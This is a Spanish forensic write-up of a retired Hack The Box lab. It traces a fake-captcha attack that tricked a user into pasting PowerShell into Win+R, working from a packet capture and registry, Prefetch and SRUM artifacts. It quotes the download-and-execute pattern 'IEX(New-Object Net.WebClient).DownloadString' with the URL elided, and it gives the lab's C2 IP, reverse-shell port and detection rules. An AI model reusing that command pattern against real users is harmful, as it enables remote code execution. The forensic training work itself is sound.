---
sherlock: Pikaptcha
domain: DFIR
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [dfir, pcap, kape, registry, runmru, powershell, clipboard]
---

# Pikaptcha — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin respuestas literales de la plataforma.

## Escenario

Un usuario abre un enlace que dice ser una actualización de Office y resuelve un captcha falso. El portapapeles acaba con una orden de PowerShell que descarga un script y abre una reverse shell. La organización entrega una captura de red de casi 500 MB y un triaje de KAPE del equipo; hay que reconstruir la secuencia y el binario que se ejecutó.

## Evidencias

```text
Pikaptcha/pikaptcha.pcapng                                  captura completa del incidente
Pikaptcha/2024-09-23T052209_alert_mssp_action.zip           triaje KAPE 1.3.0.2
  C/Users/<usuario>/NTUSER.DAT (+ .LOG1/.LOG2, UsrClass.dat)
  C/Windows/prefetch/*.pf
  C/Windows/System32/sru/SRUDB.dat
  _CopyLog.csv, _SkipLog.csv
```

```bash
sha256sum pikaptcha.pcapng *.zip      # anotar antes de analizar
regipy-process-transaction-logs NTUSER.DAT -p NTUSER.DAT.LOG1 -s NTUSER.DAT.LOG2
```

El hive está sucio: sin reproducir los logs de transacción se pierden las últimas claves escritas, que son justo las del incidente.

## Investigación

### 1. Inventario y triaje

Primero la captura, porque da el orden de los hechos y los objetos descargados. En Wireshark, `File → Export Objects → HTTP` recupera la página del captcha y el script `.ps1`. Después se trabaja el hive: `regipy-dump NTUSER.DAT.restored > NTUSER.json` y se busca `powershell`, `RunMRU` y `Console`.

```bash
tshark -r pikaptcha.pcapng -Y 'http.request' -T fields -e frame.time -e ip.dst -e http.host -e http.request.uri | head
```

### 2. Línea temporal

La hora de la captura y la de los artefactos coincide en UTC; no hay que convertir. La secuencia es: clic en el enlace, página con captcha, `stageClipboard()` copiando la orden, ejecución desde el diálogo `Win+R` (queda en `RunMRU`) y descarga de `office2024install.ps1` desde `43.205.115.44`. El script descodifica una cadena base64 y abre una conexión a `43.205.115.44:6969`, activa entre las 05:07:48 y las 05:14:31.

### 3. Artefacto clave

`RunMRU` es la prueba de que la orden se ejecutó desde el portapapeles y no desde una consola: la entrada conserva el comando completo con `IEX(New-Object Net.WebClient).DownloadString(...)`. Los `.pf` de Prefetch confirman la ejecución de `powershell.exe` y `curl.exe` en la misma franja, y `SRUDB.dat` añade el proceso con su hora de inicio.

```bash
grep -o '"[^"]*powershell[^"]*"' NTUSER.json | head
```

El hash del `.ps1` exportado se anota como IOC y se compara con el del objeto descargado en la captura.

## Conclusiones

- Entrada: ingeniería social con captcha falso y abuso del portapapeles; la orden se ejecuta manualmente desde `Win+R`.
- Ejecución: PowerShell descarga y ejecuta un script remoto; después una reverse shell codificada en base64.
- C2: `43.205.115.44`, puertos 80 para la descarga y 6969 para la shell.
- Persistencia: no se observa; la ventana de actividad es de unos siete minutos.
- IOC: hash del `.ps1`, IP del servidor, ruta del script y entrada de `RunMRU`.

## Lecciones

- El portapapeles es un canal de ejecución: un botón "Copiar" que escribe PowerShell y un captcha que pide pegarlo en `Win+R` es la cadena completa.
- Un hive con `.LOG1`/`.LOG2` sin reproducir oculta las claves más recientes; `regipy` o Registry Explorer son obligatorios.
- La captura permite recuperar el script aunque el EDR lo haya borrado del disco.
- Mitigación: bloquear la ejecución desde `RunMRU` para usuarios estándar, restringir PowerShell a modo lenguaje restringido y alertar de `IEX` con descarga.
- Detección: `4104` con `DownloadString`, `4688` de `powershell.exe` con `-nop -w hidden`, conexiones salientes a IPs sin reputación y `RunMRU` con `powershell`.
- Lo que faltaría: telemetría de Sysmon con `DNS` y `NetworkConnect` para atar proceso y conexión.

MITRE: T1204.002 (malicious file), T1059.001 (PowerShell), T1105 (ingress tool transfer), T1071.001 (web protocols).
